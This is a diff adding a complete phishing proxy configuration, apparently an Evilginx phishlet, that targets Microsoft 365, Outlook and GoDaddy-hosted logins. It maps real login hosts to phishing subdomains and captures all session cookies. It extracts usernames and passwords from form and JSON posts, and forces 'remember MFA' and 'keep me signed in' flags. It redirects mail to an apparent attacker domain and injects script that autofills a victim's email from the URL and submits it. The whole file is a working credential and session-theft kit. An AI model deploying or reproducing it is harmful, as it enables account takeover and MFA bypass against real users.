@@ -1,0 +1,165 @@
+name: 'o365'
+min_ver: '3.3.0'
+proxy_hosts:
+  - {phish_sub: 'loq', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, is_landing: false}
+  - {phish_sub: 'lo', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false}
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'live.com', session: true, is_landing: false}
+  - {phish_sub: 'logincdn', orig_sub: 'logincdn', domain: 'msauth.net', session: true, is_landing: false}
+  - {phish_sub: 'so', orig_sub: 'sso', domain: 'godaddy.com', session: true, is_landing: false}
+  - {phish_sub: '', orig_sub: '', domain: 'godaddy.com', session: true, is_landing: false}
+  - {phish_sub: 'events.api', orig_sub: 'events.api', domain: 'godaddy.com', session: true, is_landing: false}
+  # post-auth handoff hosts (work/school + consumer landing)
+  - {phish_sub: 'm365', orig_sub: 'm365', domain: 'cloud.microsoft', session: true, is_landing: false}
+  - {phish_sub: 'owa', orig_sub: 'outlook', domain: 'office365.com', session: true, is_landing: false}
+  - {phish_sub: 'outlooko', orig_sub: 'outlook', domain: 'office.com', session: true, is_landing: false}
+
+sub_filters:
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/ppsecure/', replace: 'https://{hostname}/ppsecure/', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/GetCredentialType.srf', replace: 'https://{hostname}/GetCredentialType.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/GetSessionState.srf', replace: 'https://{hostname}/GetSessionState.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'logincdn', domain: 'msauth.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {triggers_on: 'login.live.com', orig_sub: 'logincdn', domain: 'msauth.net', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  # keep the post-auth landing / mailbox handoff on the proxy (both login hosts)
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'm365', domain: 'cloud.microsoft', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {triggers_on: 'login.live.com', orig_sub: 'm365', domain: 'cloud.microsoft', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'outlook', domain: 'office365.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'outlook', domain: 'office.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {triggers_on: 'login.live.com', orig_sub: 'outlook', domain: 'office.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+
+auth_tokens:
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie', 'WLSSC', 'RPSSecAuth', '.*,regexp']
+  - domain: 'login.microsoftonline.com'
+    keys: ['SignInStateCookie', '.*,regexp']
+  - domain: 'login.live.com'
+    keys: ['.*,regexp']
+  - domain: '.login.live.com'
+    keys: ['.*,regexp']
+  - domain: '.live.com'
+    keys: ['.*,regexp']
+  - domain: '.microsoftonline.com'
+    keys: ['.*,regexp']
+  - domain: '.msauth.net'
+    keys: ['.*,regexp']
+  # GoDaddy-hosted O365 (CSP/federated logins)
+  - domain: '.godaddy.com'
+    keys: ['.*,regexp']
+  - domain: 'sso.godaddy.com'
+    keys: ['.*,regexp']
+  # mailbox surfaces
+  - domain: '.cloud.microsoft'
+    keys: ['.*,regexp']
+  - domain: 'm365.cloud.microsoft'
+    keys: ['.*,regexp']
+  - domain: '.office365.com'
+    keys: ['.*,regexp']
+  - domain: 'outlook.office365.com'
+    keys: ['.*,regexp']
+  - domain: '.outlook.com'
+    keys: ['.*,regexp']
+
+force_post:
+  - path: "/ppsecure/post*"
+    search:
+      - { key: "LoginOptions", search: "1" }
+    force:
+      - { key: "DontShowAgain", value: "true" }
+    type: "post"
+
+  - path: '/kmsi'
+    search:
+      - {key: 'LoginOptions', search: '.*'}
+    force:
+      - {key: 'LoginOptions', value: '1'}
+    type: 'post'
+
+  - path: '/common/SAS'
+    search:
+      - {key: 'rememberMFA', search: '.*'}
+    force:
+      - {key: 'rememberMFA', value: 'true'}
+    type: 'post'
+
+auth_urls:
+  - '/kmsi'
+  - '/?auth=2'
+  - '/common/login'
+  - '/common/oauth2/'
+  - '/oauth2/v2.0/'
+  - '/landingv2*'
+  - "/ppsecure/*"
+  - "/ppsecure/post.srf*"
+  - "/landing*"
+  - '/common/SAS/ProcessAuth'
+
+credentials:
+  username:
+    key: (loginfmt|login|UserName|username|email|account|loginEmail)
+    search: '(.*)'
+    type: "post"
+  password:
+    key: (passwd|Password|password|login_password|pass|pwd|session_password|PASSWORD)
+    search: '(.*)'
+    type: "post"
+  custom:
+    - key: ""
+      search: '"username":"([^"]*)'
+      type: "json"
+    - key: ""
+      search: '"password":"([^"]*)'
+      type: "json"
+
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
+
+redirect_uri:
+  - path: '/'
+    search: 'https://outlook.office365.com'
+    replace: 'https://owa.juxtaposedart.com'
+  - path: '/'
+    search: 'https://outlook.live.com'
+    replace: 'https://mail.juxtaposedart.com'
+  - path: '/'
+    search: 'https://outlook.office.com'
+    replace: 'https://owa.juxtaposedart.com'
+
+js_inject:
+  - trigger_domains: ["login.microsoftonline.com", "login.live.com"]
+    trigger_paths: ["/common/oauth2/", "/", "/*", "/common/oauth2/v2.0/authorize"]
+    script: |
+      function lp(){
+        var emailId = document.querySelector("#i0116") || document.querySelector("#usernameEntry");
+        var nextButton = document.querySelector("#idSIButton9")
+          || document.querySelector("input[type=submit]")
+          || document.querySelector("button[type=submit]")
+          || document.querySelector("[data-testid='primaryButton']");
+        var query = window.location.href;
+        if (emailId && !emailId.value) {
+          var frag = "";
+          if (/#/.test(query)) { frag = query.split("#")[1] || ""; }
+          var decodedString = frag;
+          if (frag && /^[A-Za-z0-9+/=]+$/.test(frag)) {
+            try { decodedString = window.atob(frag.replace(/[=]/gi, '')); } catch(e) {}
+          }
+          if (decodedString && decodedString.indexOf("@") !== -1) {
+            try {
+              var setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
+              setter.call(emailId, decodedString);
+              emailId.dispatchEvent(new Event("input", {bubbles:true}));
+              emailId.dispatchEvent(new Event("change", {bubbles:true}));
+              if (nextButton) { setTimeout(function(){ nextButton.click(); }, 300); }
+            } catch(e) {}
+          }
+        }
+        setTimeout(function(){ lp(); }, 500);
+      }
+      setTimeout(function(){ lp(); }, 500);
